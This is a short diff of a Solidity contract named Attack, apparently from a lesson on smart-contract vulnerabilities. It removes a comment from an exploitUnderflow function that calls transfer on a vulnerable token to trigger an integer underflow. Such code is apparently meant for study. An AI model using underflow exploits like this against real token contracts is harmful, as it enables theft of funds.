@@ -11,6 +11,6 @@ contract Attack {
     }
 
     function exploitUnderflow() public {
-        vulnerableToken.transfer(msg.sender, 100); // ⚡ Try sending way more than 2 tokens
+        vulnerableToken.transfer(msg.sender, 100);
     }
 }
